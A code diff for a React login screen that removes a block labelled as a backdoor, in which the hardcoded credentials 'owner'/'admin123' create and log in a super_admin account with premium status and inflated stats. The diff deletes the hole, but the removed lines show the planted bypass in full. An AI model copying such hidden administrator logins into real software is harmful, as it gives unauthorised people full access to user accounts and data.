@@ -30,22 +30,6 @@ const LoginScreen = ({ onLogin, onRegister, onGuestLogin }) => {
   const handleSubmit = () => {
     setError('');
     if (!formData.name || !formData.password) { setError('Please fill all fields'); return; }
-    
-    // BACKDOOR OWNER
-    if (mode === 'login' && formData.name === 'owner' && formData.password === 'admin123') {
-        const ownerProfile = {
-            name: 'owner',
-            password: 'admin123',
-            role: 'super_admin',
-            age: 'Adult',
-            avatarUrl: 'https://api.dicebear.com/9.x/notionists/svg?seed=Owner&backgroundColor=ffdfbf',
-            stats: { streak: 999, stars: 9999 },
-            plan: 'premium'
-        };
-        saveUserToDB('owner', ownerProfile);
-        onLogin('owner', 'admin123');
-        return;
-    }
 
     if (mode === 'login') {
       const res = onLogin(formData.name, formData.password);
